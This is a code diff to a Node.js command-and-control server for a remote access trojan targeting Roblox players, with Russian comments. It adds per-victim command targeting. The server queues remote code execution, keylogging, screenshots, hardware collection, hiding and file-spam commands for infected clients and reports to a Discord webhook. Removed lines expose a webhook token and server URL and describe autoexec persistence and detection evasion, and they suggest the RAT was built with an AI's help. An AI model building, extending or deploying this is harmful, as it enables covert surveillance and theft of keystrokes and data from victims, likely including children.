@@ -1,3 +1,4 @@
+[file content begin]
 const http = require('http');
 const fetch = require('node-fetch');
 
@@ -18,7 +19,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
         fields: fields,
         timestamp: new Date().toISOString(),
         footer: {
-            text: "RAT Control System v2.8"
+            text: "RAT Control System v3.0"
         }
     };
 
@@ -53,6 +54,12 @@ function cleanupInactiveUsers() {
 // Запускаем очистку каждые 30 секунд
 setInterval(cleanupInactiveUsers, 30 * 1000);
 
+// НОВАЯ ФУНКЦИЯ: Получение списка онлайн пользователей (только имена)
+function getOnlinePlayers() {
+    cleanupInactiveUsers();
+    return Array.from(global.onlineUsers.keys());
+}
+
 const server = http.createServer((req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -66,32 +73,51 @@ const server = http.createServer((req, res) => {
         return;
     }
     
+    // НОВЫЙ ЭНДПОИНТ: Получение списка онлайн пользователей (просто имена)
+    if (req.method === 'GET' && req.url === '/online_players') {
+        try {
+            const players = getOnlinePlayers();
+            res.end(JSON.stringify({
+                players: players,
+                count: players.length,
+                timestamp: new Date().toISOString()
+            }));
+        } catch (e) {
+            res.statusCode = 500;
+            res.end(JSON.stringify({ error: "Server error", details: e.message }));
+        }
+        return;
+    }
+    
     if (req.method === 'POST' && req.url === '/command') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
             try {
-                const { command, args } = JSON.parse(body);
-                console.log(`📨 Получена команда: ${command}`, args ? args : '');
+                const { command, args, targetPlayer } = JSON.parse(body);
+                console.log(`📨 Получена команда: ${command} для игрока: ${targetPlayer || "ALL"}`, args ? args : '');
                 
-                // Добавляем команду в очередь для ВСЕХ клиентов
+                // Добавляем команду в очередь с указанием цели
                 commandQueue.push({
                     command: command,
                     args: args || [],
+                    target: targetPlayer || null, // null = всем игрокам
                     timestamp: Date.now()
                 });
 
-                // Логирование в Discord только для важных событий
+                // Логирование в Discord с указанием цели
+                const targetInfo = targetPlayer ? `🎯 **Цель:** ${targetPlayer}\n` : "🎯 **Цель:** ВСЕ игроки\n";
+                
                 if (command === "user_chat") {
                     await sendDiscordMessage(
                         "💬 Чат игрока",
-                        `**${args[0]}:** ${args[1]}`,
+                        `${targetInfo}**${args[0]}:** ${args[1]}`,
                         0x3498db
                     );
                 } else if (command === "execute_log") {
                     await sendDiscordMessage(
                         "🔧 Выполнение кода",
-                        `**Игрок:** ${args[0]}\n**Результат:** ${args[1]}`,
+                        `${targetInfo}**Игрок:** ${args[0]}\n**Результат:** ${args[1]}`,
                         0xf39c12
                     );
                 } else if (command === "inject_notify") {
@@ -106,19 +132,19 @@ const server = http.createServer((req, res) => {
                 } else if (command === "memory_spam_start") {
                     await sendDiscordMessage(
                         "💾 Memory Spam запущен",
-                        `**Количество файлов:** ${args[0]}\n**Статус:** Выполняется`,
+                        `${targetInfo}**Количество файлов:** ${args[0]}\n**Статус:** Выполняется`,
                         0xff6b6b
                     );
                 } else if (command === "gallery_spam_start") {
                     await sendDiscordMessage(
                         "🖼️ Gallery Spam запущен",
-                        `**Количество файлов:** ${args[0]}\n**Источник:** GitHub`,
+                        `${targetInfo}**Количество файлов:** ${args[0]}\n**Источник:** GitHub`,
                         0x74b9ff
                     );
                 } else if (command === "spam_completed") {
                     await sendDiscordMessage(
                         "✅ Spam операция завершена",
-                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
+                        `${targetInfo}**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
                         0x00ff00
                     );
                 } else if (command === "jumpscare") {
@@ -129,14 +155,21 @@ const server = http.createServer((req, res) => {
                     
                     await sendDiscordMessage(
                         "👻 Скример запущен!",
-                        `**Тип:** ${scareNames[args[0]] || "Неизвестный"}\n**Время:** ${new Date().toLocaleTimeString()}\n**Device:** ${args[1] || "Unknown"}`,
+                        `${targetInfo}**Тип:** ${scareNames[args[0]] || "Неизвестный"}\n**Время:** ${new Date().toLocaleTimeString()}\n**Device:** ${args[1] || "Unknown"}`,
                         0xff0000
+                    );
+                } else {
+                    // Для обычных команд
+                    await sendDiscordMessage(
+                        "🎮 Команда отправлена",
+                        `${targetInfo}**Команда:** ${command}\n**Аргументы:** ${args?.join(', ') || 'нет'}`,
+                        0x3498db
                     );
                 }
 
                 res.end(JSON.stringify({ 
                     status: "OK",
-                    message: `Команда ${command} принята`
+                    message: `Команда ${command} принята для ${targetPlayer || "всех игроков"}`
                 }));
             } catch (e) {
                 console.error('Ошибка обработки команды:', e);
@@ -151,18 +184,42 @@ const server = http.createServer((req, res) => {
         console.log(`📡 Клиент запрашивает команды (в очереди: ${commandQueue.length})`);
         
         if (commandQueue.length > 0) {
-            const commands = [...commandQueue];
-            commandQueue = [];
+            // НЕ очищаем всю очередь - только отправляем команды, предназначенные этому клиенту
+            const commandsForClient = [];
+            const remainingCommands = [];
             
-            console.log(`📤 Отправка ${commands.length} команд клиенту`);
+            // Получаем имя игрока из query параметра
+            const playerName = req.headers['x-player-name'] || new URL(req.url, `http://${req.headers.host}`).searchParams.get('player');
             
-            const nextCommand = commands[0];
+            for (const cmd of commandQueue) {
+                // Если команда предназначена всем ИЛИ конкретно этому игроку
+                if (cmd.target === null || cmd.target === playerName) {
+                    commandsForClient.push(cmd);
+                } else {
+                    remainingCommands.push(cmd);
+                }
+            }
             
-            res.end(JSON.stringify({
-                command: nextCommand.command,
-                args: nextCommand.args,
-                timestamp: nextCommand.timestamp
-            }));
+            // Обновляем очередь (оставляем только не предназначенные этому клиенту)
+            commandQueue = remainingCommands;
+            
+            if (commandsForClient.length > 0) {
+                const nextCommand = commandsForClient[0];
+                
+                console.log(`📤 Отправка команды ${nextCommand.command} игроку ${playerName || "unknown"}`);
+                
+                res.end(JSON.stringify({
+                    command: nextCommand.command,
+                    args: nextCommand.args,
+                    timestamp: nextCommand.timestamp
+                }));
+            } else {
+                // Нет команд для этого игрока
+                res.end(JSON.stringify({
+                    command: "",
+                    args: []
+                }));
+            }
         } else {
             res.end(JSON.stringify({
                 command: "",
@@ -172,6 +229,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    // ... остальной код сервера остается без изменений ...
     if (req.method === 'POST' && req.url === '/screenshot') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -252,7 +310,6 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Получение списка онлайн пользователей
     if (req.method === 'GET' && req.url === '/users') {
         try {
             cleanupInactiveUsers(); // Очищаем перед отправкой
@@ -281,7 +338,6 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Обновление информации о пользователе
     if (req.method === 'POST' && req.url === '/users') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -310,91 +366,77 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Статус сервера
     if (req.method === 'GET' && req.url === '/status') {
         cleanupInactiveUsers();
         
         res.end(JSON.stringify({
             status: "online",
-            version: "2.8.0",
+            version: "3.0.0",
             timestamp: new Date().toISOString(),
             pending_commands: commandQueue.length,
             online_users: global.onlineUsers.size,
+            online_players: getOnlinePlayers(),
             features: [
                 "player_control",
-                "chat_system", 
+                "targeted_commands", 
+                "chat_system",
                 "screenshots",
                 "keylogger",
                 "hardware_info",
                 "jumpscare_system",
                 "spam_tools",
                 "user_tracking",
-                "auto_persistence"
+                "auto_persistence",
+                "smart_targeting"
             ]
         }));
         return;
     }
 
-    // Полная информация о системе (для нового AI)
     if (req.method === 'GET' && req.url === '/system_info') {
         res.end(JSON.stringify({
             project: "RAT Control System",
-            version: "2.8.0",
-            description: "Продвинутая система удаленного управления Roblox клиентами",
+            version: "3.0.0",
+            description: "Продвинутая система удаленного управления Roblox клиентами с адресным выполнением команд",
             features: [
                 {
                     category: "Управление игроком",
-                    commands: ["/kick", "/freeze", "/void", "/spin", "/fling", "/sit", "/dance"]
+                    commands: ["/kick <причина> [игрок]", "/freeze <секунды> [игрок]", "/void [игрок]", "/spin [игрок]", "/fling [игрок]", "/sit [игрок]", "/dance [игрок]"]
                 },
                 {
                     category: "Чат и сообщения",
-                    commands: ["/chat", "/message", "/popup", "/user_chat"]
+                    commands: ["/chat [игрок]", "/message <текст> [игрок]", "/popup <текст> [игрок]"]
                 },
                 {
                     category: "Аудио/Видео",
-                    commands: ["/mute", "/unmute", "/playaudio", "/blur", "/screenshot"]
+                    commands: ["/mute [игрок]", "/unmute [игрок]", "/playaudio <id> [игрок]", "/blur <секунды> [игрок]", "/screenshot [игрок]"]
                 },
                 {
                     category: "Системные команды",
-                    commands: ["/execute", "/fakeerror", "/keylog", "/stopkeylog", "/hardware", "/hide"]
+                    commands: ["/execute <код> [игрок]", "/fakeerror <текст> [игрок]", "/keylog [игрок]", "/stopkeylog [игрок]", "/hardware [игрок]", "/hide [игрок]"]
                 },
                 {
                     category: "Пользователи",
-                    commands: ["/users"]
+                    commands: ["/users", "/online"]
                 },
                 {
                     category: "Скримеры",
-                    commands: ["/jumpscare 1 (Джефф)", "/jumpscare 2 (Соник.exe)"]
+                    commands: ["/jumpscare <тип> [игрок]"]
                 },
                 {
                     category: "Spam инструменты",
-                    commands: ["/memory", "/gallery"]
+                    commands: ["/memory <кол-во> [игрок]", "/gallery <кол-во> [игрок]"]
                 }
             ],
-            technical_details: {
-                server_url: "https://ratserver-6wo3.onrender.com",
-                webhook_url: "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_",
-                lua_client_features: [
-                    "Автоопределение устройства (PC/Mobile/Tablet)",
-                    "Автоклонирование в autoexec для ПК",
-                    "Полноэкранные скримеры с эффектами",
-                    "Рабочий чат с пузырьками сообщений",
-                    "Кейлоггер с отправкой в Discord",
-                    "Сбор информации об оборудовании",
-                    "Файловый спам (memory/gallery)",
-                    "Система отслеживания онлайн пользователей",
-                    "Защита от обнаружения (скрытие скрипта)"
-                ],
-                discord_bot_features: [
-                    "Полный набор команд управления",
-                    "Красивые embed сообщения",
-                    "Статус системы",
-                    "Список онлайн пользователей",
-                    "Логирование всех действий"
+            targeting_system: {
+                description: "Умная система выбора цели",
+                rules: [
+                    "Если указан игрок - команда выполняется только у него",
+                    "Если игрок не указан и онлайн 1 игрок - команда выполняется у него",
+                    "Если игрок не указан и онлайн >1 игрока - команда отправляется всем",
+                    "Для принудительной отправки всем используйте '*' как имя игрока"
                 ]
-            },
-            project_history: "Разработан совместно с пользователем как продвинутый RAT для Roblox с уникальными функциями скримеров, автоустановкой и расширенным контролем.",
-            notes: "Система автоматически определяет тип устройства, клонируется в autoexec на ПК, имеет профессиональные скримеры с эффектами тряски и мерцания, полноценный чат и полный контроль над клиентом."
+            }
         }));
         return;
     }
@@ -405,23 +447,16 @@ const server = http.createServer((req, res) => {
 
 server.listen(process.env.PORT || 3000, () => {
     console.log("🚀 Сервер запущен на порту 3000");
-    console.log("📊 Версия: 2.8.0");
+    console.log("📊 Версия: 3.0.0");
+    console.log("🎯 Новая система: Адресные команды с умным выбором цели");
     console.log("🔗 Webhook: " + WEBHOOK_URL);
     console.log("✅ Готов к приему команд");
-    console.log("👥 Система отслеживания пользователей активна");
-    console.log("👻 Скример система: ДЖЕФФ & СОНИК (полноэкранные)");
-    console.log("📱 Автоопределение устройства: PC/Mobile/Tablet");
-    console.log("💾 Автоклонирование для ПК: ВКЛЮЧЕНО");
-    console.log("⏱️  Обновление данных: каждые 15 секунд");
+    console.log("🎮 Система выбора цели: АВТОМАТИЧЕСКАЯ");
+    console.log("👤 Формат команд: /команда аргументы [игрок]");
     console.log("\n📡 Эндпоинты:");
-    console.log("• POST /command - Отправка команд клиентам");
-    console.log("• GET  /data - Получение команд клиентом");
-    console.log("• POST /screenshot - Получение скриншотов");
-    console.log("• GET  /screenshot - Получение последнего скриншота");
-    console.log("• POST /keylog - Получение данных кейлоггера");
-    console.log("• POST /hardware - Получение информации об оборудовании");
-    console.log("• GET  /users - Список онлайн пользователей");
-    console.log("• POST /users - Обновление информации о пользователе");
-    console.log("• GET  /status - Статус сервера");
-    console.log("• GET  /system_info - Полная информация о проекте");
+    console.log("• POST /command - Отправка команд с указанием цели");
+    console.log("• GET  /data?player=NAME - Получение команд для конкретного игрока");
+    console.log("• GET  /online_players - Список имен онлайн игроков");
+    console.log("• GET  /users - Детальная информация об игроках");
 });
+[file content end]
